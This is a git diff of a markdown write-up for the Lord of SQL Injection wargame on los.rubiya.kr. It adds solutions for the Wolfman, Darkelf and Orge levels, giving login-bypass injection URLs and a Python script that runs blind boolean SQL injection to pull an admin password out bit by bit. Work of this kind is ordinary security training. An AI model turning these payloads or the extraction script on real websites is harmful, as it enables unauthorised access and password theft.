@@ -3,7 +3,7 @@
 
 
 ## Gremlin
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Gremlinq.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Gremlin.png)
 Solution:
 
 Using ?id=1&pw=1%27%20or%201%23 would result the query execute.
@@ -70,10 +70,74 @@ Script:
                 
 
 Output:
+
 ![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orcans.png)
 
+Try the password in the url by setting it to the argument 'pw'
+
+like:  ?pw=09509852
+
+## Wolfman
+
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Wolfman.png)
+
+link: https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=%27%09or%09id=%27admin%27%23
+
+query : select id from prob_wolfman where id='guest' and pw='' or id='admin'#'
+
+## Darkelf
+
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Darkelf.png)
+
+link: https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=%27%20||%20id=%27admin%27%23
+
+query : select id from prob_darkelf where id='guest' and pw='' || id='admin'#'
+
+## Orge
+
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orge.png)
+
+Script:
+
+                    import requests
+                    url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
+                    header={"Cookie":"PHPSESSID=bdjvoop9fovas64ejtr7vo3m4b"}
+                    sess=requests.session()
+
+                    payload="?pw=' || id='admin' %26%26 length(pw)="
+                    for i in range(1,100):
+                        pay=url+payload+str(i)+"%23"
+                        x=sess.get(pay,headers=header)
+                        print("Check:",i,end=" ")
+                        
+                        if "Hello admin" in x.text:
+                            length=i
+                            break
+                        else:
+                            print("Fail")
+                    print("Success\nlength:",length)
 
 
+                    payload="?pw=' || id='admin' %26%26 "
+                    password=''
+                    for i in range(1,length+1):
+                        bits=''
+                        print("check:",i,end="")
+                        for j in range(1,length+1):
+                            pay=url+payload+"MID(lpad(bin(conv(hex(MID(pw,"+str(i)+",1)),16,10)),8,0),"+str(j)+",1)=1%23"
+                            x=sess.get(pay,headers=header)
+                            
+                            
+                            if "Hello admin" in x.text:
+                                bits+='1'
+                            else:
+                                bits+='0'
+                        password+=''.join(chr(int(bits, 2)))
+                        print("\t",chr(int(bits,2)))
+                    print("Password:"+password)
 
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orgeans.png)
 
+Try the password in the url by setting it to the argument 'pw'
 
+like:  ?pw=7b751aec
